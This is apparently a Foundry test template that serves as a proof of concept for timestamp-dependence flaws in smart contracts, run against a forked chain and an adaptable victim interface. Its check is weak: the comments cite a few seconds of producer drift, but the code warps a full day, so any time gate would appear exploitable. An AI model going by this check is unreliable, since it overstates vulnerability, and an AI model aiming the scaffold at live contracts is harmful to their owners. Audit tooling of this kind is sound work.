// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Timestamp dependence (miner-controllable block.timestamp)
/// @notice DASP / SmartBugs-Curated category: time_manipulation. The target gates
///         a payout, lock, or outcome on `block.timestamp` (or treats it as
///         entropy). A block producer can shift the timestamp by the consensus
///         drift (a few seconds, more on some chains) to cross the gate early or
///         to steer a timestamp-derived "random" outcome.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Adapt IVictim to the target's real ABI: the
///      view that reads the time-gated state, and the entry point the gate
///      protects.
///      Passing = the observable state flips with block.timestamp alone (the
///      gate is producer-controllable) = reproduced.
///      Failing = the gate does not move with the timestamp, or is bound to a
///      non-manipulable clock = did NOT reproduce.

interface IVictim {
    // TODO: the view that exposes the time-gated state (e.g. isSaleFinished(),
    // isUnlocked(), winner(), hasEnded()).
    function isSaleFinished() external view returns (bool);
    // TODO: the entry the gate protects (claim / withdraw / buy).
    function claim() external;
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        // The observable the gate controls, read at the forked block time.
        bool gatedBefore = IVictim(target).isSaleFinished();

        // A block producer nudges the timestamp within the allowed drift. A
        // gate that is a pure function of block.timestamp moves with it; a
        // gate bound to a trusted clock does not.
        vm.warp(block.timestamp + 1 days);
        bool gatedAfter = IVictim(target).isSaleFinished();

        console.log("time-gated state before warp:", gatedBefore);
        console.log("time-gated state after warp: ", gatedAfter);

        // Reproduced when block.timestamp ALONE flips the gated state.
        assertTrue(
            gatedBefore != gatedAfter,
            "exploit did not reproduce: the gate does not move with block.timestamp"
        );
    }
}
